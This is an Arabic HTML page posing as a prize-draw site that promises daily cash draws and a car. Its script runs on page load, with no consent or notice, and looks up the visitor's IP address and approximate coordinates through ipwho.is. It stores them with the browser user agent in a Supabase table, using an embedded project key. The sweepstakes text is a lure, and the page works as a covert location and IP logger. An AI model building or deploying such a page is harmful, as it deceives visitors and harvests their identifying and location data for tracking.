<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>سحوبات وجوائز</title>

<meta http-equiv="Content-Security-Policy"
  content="default-src 'self';
           img-src * data:;
           script-src 'self' https://cdn.jsdelivr.net;
           connect-src 'self' https://*.supabase.co https://ipwho.is;
           style-src 'self' 'unsafe-inline';
           frame-ancestors 'none';
           upgrade-insecure-requests">

<style>
  body{font-family:system-ui,-apple-system,Segoe UI;min-height:100svh;display:grid;place-items:center;padding:24px;background:#fafafa}
  .card{max-width:560px;width:100%;border:1px solid #e5e7eb;border-radius:12px;padding:22px;background:#fff;box-shadow:0 6px 20px rgba(0,0,0,.06)}
  .muted{color:#6b7280}.ok{color:#047857;font-weight:700}.err{color:#b91c1c;font-weight:700}
  progress{width:100%}.hidden{display:none}
  pre{white-space:pre-wrap;background:#f9fafb;border:1px dashed #ddd;padding:10px;border-radius:8px;direction:ltr}
</style>
</head>
<body>
  <div class="card">
    <h1>سحوبات وجوائز</h1>
    <p class="muted">شارك معنا وادخل على سحوبات يوميه 1000 ريال واربح جوائز اسبوعية سيارة 2025</p>
    <progress id="bar" max="100" value="10"></progress>
    <p id="status" class="muted">جار التحضير…</p>
    <button id="retry" class="hidden">إعادة المحاولة</button>
    <details style="margin-top:10px"><summary>تفاصيل التشخيص</summary><pre id="log"></pre></details>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    // ===== الإعدادات =====
    const SUPA_URL = 'https://weaiftikalbujuecfuhf.supabase.co';
    const SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndlYWlmdGlrYWxidWp1ZWNmdWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYzOTU2MzAsImV4cCI6MjA3MTk3MTYzMH0.kxiytsgnkEOim_zUD49zgVp7rxr3nHAVHFb0Jq9dijk';
    const TABLE    = 'pings';
    const sb = window.supabase.createClient(SUPA_URL, SUPA_KEY);

    // عناصر
    const bar = document.getElementById('bar');
    const statusEl = document.getElementById('status');
    const retryBtn = document.getElementById('retry');
    const logEl = document.getElementById('log');

    // لوج تفصيلي يُعرض على الصفحة
    function log(...args){ console.log(...args); logEl.textContent += args.map(a=>typeof a==='string'?a:JSON.stringify(a,null,2)).join(' ') + '\n'; }
    function setStatus(t, c){ statusEl.textContent = t; statusEl.className = c || 'muted'; }
    window.addEventListener('error', e=>{ setStatus('JS Error: '+e.message,'err'); log('window.onerror:', e.message, e.filename, e.lineno); });

    // IP فقط للتشخيص
    async function ipGeo(){
      const r = await fetch('https://ipwho.is/', { cache:'no-store' });
      log('ipwho.is status', r.status);
      if(!r.ok) throw new Error('IP request failed: '+r.status);
      const j = await r.json();
      log('ipwho.is body', j);
      if (!j.success) throw new Error('IP geolocation failed');
      return { lat:j.latitude ?? null, lng:j.longitude ?? null, ip:j.ip ?? null, accuracy:5000 };
    }

    async function save(row){
      const { data, error, status } = await sb.from(TABLE).insert([row]).select('*');
      log('supabase insert status', status, 'data', data, 'error', error);
      if (error) throw new Error(error.message);
      return data;
    }

    async function start(){
      try{
        setStatus('جلب موقع تقريبي عبر IP…'); bar.value=40;
        const ua = navigator.userAgent;
        const g = await ipGeo();

        setStatus('حفظ في Supabase…'); bar.value=70;
        const saved = await save({ lat:g.lat, lng:g.lng, accuracy:g.accuracy, ip:g.ip, ua, note:'diag', device_info:ua });

        bar.value=100;
        setStatus('تم الحفظ ✅','ok');
        log('row saved:', saved);
      }catch(e){
        setStatus('خطأ: '+e.message, 'err');
        retryBtn.classList.remove('hidden');
        log('caught error:', e.message);
      }
    }

    retryBtn.addEventListener('click', ()=>{ retryBtn.classList.add('hidden'); logEl.textContent=''; setStatus('إعادة المحاولة…'); bar.value=10; start(); });
    start();
  </script>
</body>
</html>
